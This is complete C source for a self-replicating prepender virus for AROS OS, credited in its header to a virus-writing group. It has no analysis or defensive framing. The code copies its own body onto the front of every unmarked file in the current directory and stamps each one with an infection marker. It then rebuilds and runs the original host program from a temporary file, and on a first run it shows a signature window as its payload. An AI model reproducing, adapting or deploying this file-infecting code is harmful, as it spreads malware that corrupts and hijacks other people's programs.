   /* This is a prepender virus for AROS OS by [WarGame/doomriderz] */

   #include <stdio.h>
   #include <dirent.h>
   #include <stdlib.h>
   #include <proto/intuition.h>
   #include <intuition/intuition.h>
   #include <sys/stat.h>

   /* virus size in bytes */
   #define FIRST_GENERATION_SIZE 258603
   /* infection marker */
   const int MARKER = 0x61788989;
   /* tmp name */
   #define TMP_NAME "Rotary_drop"
   /* all virus body & host code*/
   char *virus_body = NULL,*host_code = NULL;

   /* the infection routine */
   void InfectFile(char *filename)
   {
      FILE *fd = NULL;
      char *original_code = NULL;
      int fd_t,size;
      struct stat fz;

      if((fd = fopen(filename,"r")) == NULL)
      {
            return;
      }

      fd_t = fileno(fd);
      fstat(fd_t,&fz);
      size = fz.st_size;

      if((original_code = malloc(size)) == NULL)
      {
         fclose(fd);
         close(fd_t);
         return;
      }

      fread(original_code,size,1,fd);
      fclose(fd);
      close(fd_t);

      if((fd = fopen(filename,"w")) == NULL)
      {
            return;
      }

      /* prepend */
      fwrite(virus_body,FIRST_GENERATION_SIZE,1,fd);
      fwrite(original_code,size,1,fd);
      fwrite(&MARKER,4,1,fd);
      fclose(fd);
      free(original_code);

   }

   /* check before infecting */
   int isGood(char *name)
   {
      FILE *fd = NULL;
      int check_mark;

      if((fd = fopen(name,"r")) == NULL)
      {
            return 0;
      }

      fseek(fd,0,SEEK_END);
      fseek(fd,-4,SEEK_CUR);
      fread(&check_mark,4,1,fd);
      fclose(fd);

      if(check_mark == MARKER)
      {
         return 0;
      }

      return 1;

   }

   /* payload */
   void PrintWindow(void)
   {
       struct Window *payloadwin = NULL;

   payloadwin = OpenWindowTags(NULL,WA_Width,500,WA_Height,20,WA_Title,"AROS.Rotary by [WarGame/doomriderz] - Dedicated to my smart sister! ",TAG_DONE);

       if(payloadwin)
       {
           sleep(5);
           CloseWindow(payloadwin);
       }
   }

   int main(int argc,char *argv[])
   {
         DIR *current_dir = NULL;
         struct dirent *cur = NULL;
         FILE *myself = NULL,*ret = NULL;
         int fd,filesize;
         struct stat fz;

         /* allocate memory */
         if((virus_body = malloc(FIRST_GENERATION_SIZE)) == NULL)
         {
            exit(0);
         }

         /* get file size */
         if((myself = fopen(argv[0],"r")) == NULL)
         {
            exit(0);
         }

         fd = fileno(myself);
         fstat(fd,&fz);
         filesize = fz.st_size;

         /* read virus in memory */
         fread(virus_body,FIRST_GENERATION_SIZE,1,myself);


         if(filesize > FIRST_GENERATION_SIZE)
         {
            if((host_code = malloc(filesize-FIRST_GENERATION_SIZE)) == NULL)
            {
            exit(0);
            }

            /* read host code */
            fread(host_code,filesize-FIRST_GENERATION_SIZE,1,myself);

         }

         fclose(myself);
         close(fd);

         /* open current dir */
         if(!(current_dir = opendir(".")))
         {
           exit(0);
         }

         /* true infection loop */
         while((cur = readdir(current_dir)))
         {
            if(isGood(cur->d_name) && strcasecmp(cur->d_name,argv[0]))
            {
               InfectFile(cur->d_name);
            }
         }

         closedir(current_dir);

         if(filesize > FIRST_GENERATION_SIZE)
         {
            if((ret = fopen(TMP_NAME,"w")) == NULL)
            {
               exit(0);
            }

            fwrite(host_code,filesize-FIRST_GENERATION_SIZE,1,ret);
            fclose(ret);
            system(TMP_NAME);
            remove(TMP_NAME);
         }

         /* show payload */
         else
         {
            PrintWindow();
         }


         free(virus_body);

   }
